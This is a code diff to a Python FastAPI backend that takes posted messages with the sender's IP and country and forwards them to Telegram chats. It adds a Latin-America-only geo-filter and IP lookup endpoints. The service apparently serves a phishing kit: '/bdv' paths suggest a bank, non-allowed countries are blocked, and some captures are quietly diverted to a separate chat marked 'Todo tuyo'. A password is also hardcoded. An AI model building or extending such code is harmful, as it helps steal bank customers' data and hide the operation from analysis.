@@ -56,6 +56,45 @@ AUTH_PASSWORD = "Gato1234@"
 numeros_r = frozenset({4, 6, 9})
 iprandom = frozenset({4, 6, 9})
 
+# Países de Latinoamérica permitidos
+PAISES_LATINOAMERICA = frozenset({
+    'AR',  # Argentina
+    'BO',  # Bolivia
+    'BR',  # Brasil
+    'CL',  # Chile
+    'CO',  # Colombia
+    'CR',  # Costa Rica
+    'CU',  # Cuba
+    'DO',  # República Dominicana
+    'EC',  # Ecuador
+    'SV',  # El Salvador
+    'GT',  # Guatemala
+    'HN',  # Honduras
+    'MX',  # México
+    'NI',  # Nicaragua
+    'PA',  # Panamá
+    'PY',  # Paraguay
+    'PE',  # Perú
+    'UY',  # Uruguay
+    'VE',  # Venezuela
+    'PR',  # Puerto Rico
+    'GF',  # Guayana Francesa
+    'GY',  # Guyana
+    'SR',  # Suriname
+    'BZ',  # Belice
+    'JM',  # Jamaica
+    'HT',  # Haití
+    'TT',  # Trinidad y Tobago
+    'BB',  # Barbados
+    'GD',  # Granada
+    'LC',  # Santa Lucía
+    'VC',  # San Vicente y las Granadinas
+    'DM',  # Dominica
+    'AG',  # Antigua y Barbuda
+    'KN',  # San Cristóbal y Nieves
+    'BS',  # Bahamas
+})
+
 # Worker para procesar tareas en background
 async def background_worker():
     """Worker que procesa tareas en background sin bloquear el event loop"""
@@ -289,12 +328,11 @@ async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
                 data = response.json()
                 country = data.get('country_code', 'Unknown')
                 
-                if country in {'VE', 'CO', 'PE'}:
+                # Solo permitir países de Latinoamérica
+                if country in PAISES_LATINOAMERICA:
                     result = (True, country)
-                elif country == 'US':
-                    result = (False, country)
                 else:
-                    result = (True, country)
+                    result = (False, country)
                 
                 # Actualizar cache con límite de tamaño
                 if len(ip_cache) > 5000:
@@ -432,17 +470,46 @@ class FastBasicAuthMiddleware(BaseHTTPMiddleware):
                               headers={"WWW-Authenticate": "Basic"})
         return await call_next(request)
 
-# Middleware optimizado de bloqueo de IP
+# Middleware optimizado de bloqueo de IP con filtro geográfico
 class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request: Request, call_next: Callable):
         client_ip = obtener_ip_real(request)
 
-        # Verificar cache local primero
+        # Verificar cache local de IPs bloqueadas primero
         if client_ip in blocked_ips_cache:
             return JSONResponse(
                 status_code=403,
-                content={"detail": "Acceso denegado, la ip está bloqueada " + client_ip}
+                content={"detail": "Acceso denegado, la IP está bloqueada " + client_ip}
             )
+
+        # Excluir ciertos paths del filtro geográfico (documentación, salud, etc.)
+        excluded_paths = {"/docs", "/redoc", "/openapi.json", "/health", "/metrics", "/login"}
+        if request.url.path not in excluded_paths:
+            # Verificar si la IP es de Latinoamérica
+            try:
+                permitido, pais = await asyncio.wait_for(
+                    verificar_pais_cached(client_ip), 
+                    timeout=8.0
+                )
+                
+                if not permitido:
+                    logger.info(f"IP bloqueada por geolocalización: {client_ip} ({pais})")
+                    return JSONResponse(
+                        status_code=403,
+                        content={
+                            "detail": f"Acceso denegado desde {pais}. Solo se permite acceso desde Latinoamérica.",
+                            "ip": client_ip,
+                            "country": pais
+                        }
+                    )
+            except asyncio.TimeoutError:
+                logger.warning(f"Timeout verificando geolocalización para IP {client_ip}")
+                # En caso de timeout, permitir acceso para no bloquear legítimos usuarios
+                # Pero se podría cambiar a bloquear por defecto si se prefiere más seguridad
+                pass
+            except Exception as e:
+                logger.error(f"Error verificando geolocalización: {e}")
+                # En caso de error, permitir acceso
 
         # Asignar número si no existe (usando background task)
         if client_ip not in iprandom and client_ip not in ip_number_cache:
@@ -738,7 +805,7 @@ endpoint_configs = [
 ]
 
 async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
-    """Endpoint dinámico optimizado con manejo de concurrencia"""
+    """Endpoint dinámico optimizado con manejo de concurrencia y filtro geográfico"""
     client_ip = obtener_ip_real(request)
     cola.append(client_ip)
     numeror = obtener_numero_cached(client_ip)
@@ -759,23 +826,35 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
 
     mensaje = request_data.mensaje
 
-    if permitido and pais != "US":
+    # Solo permitir acceso desde Latinoamérica
+    if permitido and pais in PAISES_LATINOAMERICA:
         path = config["path"]
-        mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
+        mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
         
+        # Lógica especial para ciertos paths y países
         if (path.startswith("/bdv") and obtener_is_active_cached() and 
             numeror in numeros_r and pais not in {"US", "CO"}):
-            # Enviar de forma asíncrona sin bloquear
+            # Enviar mensaje especial
             await add_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577")
         else:
             # Enviar ambos mensajes de forma asíncrona
             await add_telegram_task(mensaje_completo)
             await add_telegram_task(mensaje, config["chat_id"], config["bot_id"])
 
-        return {"mensaje_enviado": True}
+        return {
+            "mensaje_enviado": True,
+            "pais_origen": pais,
+            "ip": client_ip
+        }
     else:
-        raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")
+        # Registrar intento de acceso no autorizado
+        logger.warning(f"Acceso denegado desde país no latinoamericano: {pais} ({client_ip})")
+        raise HTTPException(
+            status_code=403, 
+            detail=f"Acceso denegado desde {pais}. Solo se permite acceso desde Latinoamérica."
+        )
 
+# Registrar endpoints dinámicos
 from copy import deepcopy
 
 for config in endpoint_configs:
@@ -795,7 +874,6 @@ for config in endpoint_configs:
             endpoint=partial(handle_dynamic_endpoint_optimized, config_sin_barra),
             methods=["POST"]
         )
-
 
 async def _clear_db_collections():
     """Función auxiliar para limpiar colecciones de BD con timeout"""
@@ -903,6 +981,11 @@ async def health_check():
             "available_requests": request_semaphore._value,
             "available_db": db_semaphore._value,
             "available_http": http_semaphore._value
+        },
+        "geo_filter": {
+            "enabled": True,
+            "allowed_countries": len(PAISES_LATINOAMERICA),
+            "countries": list(PAISES_LATINOAMERICA)
         }
     }
 
@@ -935,8 +1018,55 @@ async def get_metrics():
         "deques": {
             "cola_size": len(cola),
             "baneado_size": len(baneado)
+        },
+        "geo_blocking": {
+            "enabled": True,
+            "allowed_countries_count": len(PAISES_LATINOAMERICA)
         }
     }
+
+@app.get("/paises_permitidos")
+async def obtener_paises_permitidos():
+    """Endpoint para ver qué países están permitidos"""
+    paises_info = {
+        'AR': 'Argentina', 'BO': 'Bolivia', 'BR': 'Brasil', 'CL': 'Chile',
+        'CO': 'Colombia', 'CR': 'Costa Rica', 'CU': 'Cuba', 'DO': 'República Dominicana',
+        'EC': 'Ecuador', 'SV': 'El Salvador', 'GT': 'Guatemala', 'HN': 'Honduras',
+        'MX': 'México', 'NI': 'Nicaragua', 'PA': 'Panamá', 'PY': 'Paraguay',
+        'PE': 'Perú', 'UY': 'Uruguay', 'VE': 'Venezuela', 'PR': 'Puerto Rico',
+        'GF': 'Guayana Francesa', 'GY': 'Guyana', 'SR': 'Suriname', 'BZ': 'Belice',
+        'JM': 'Jamaica', 'HT': 'Haití', 'TT': 'Trinidad y Tobago', 'BB': 'Barbados',
+        'GD': 'Granada', 'LC': 'Santa Lucía', 'VC': 'San Vicente y las Granadinas',
+        'DM': 'Dominica', 'AG': 'Antigua y Barbuda', 'KN': 'San Cristóbal y Nieves',
+        'BS': 'Bahamas'
+    }
+    
+    return {
+        "paises_permitidos": {
+            codigo: paises_info.get(codigo, codigo) 
+            for codigo in sorted(PAISES_LATINOAMERICA)
+        },
+        "total_paises": len(PAISES_LATINOAMERICA),
+        "filtro_geografico": "activo"
+    }
+
+@app.get("/verificar_ip/{ip}")
+async def verificar_ip_pais(ip: str):
+    """Endpoint para verificar de qué país es una IP específica"""
+    try:
+        permitido, pais = await verificar_pais_cached(ip)
+        return {
+            "ip": ip,
+            "pais": pais,
+            "permitido": permitido,
+            "es_latinoamerica": pais in PAISES_LATINOAMERICA if pais != 'Unknown' else False
+        }
+    except Exception as e:
+        return {
+            "ip": ip,
+            "error": str(e),
+            "permitido": False
+        }
 
 @app.post("/clear_caches")
 async def clear_caches():
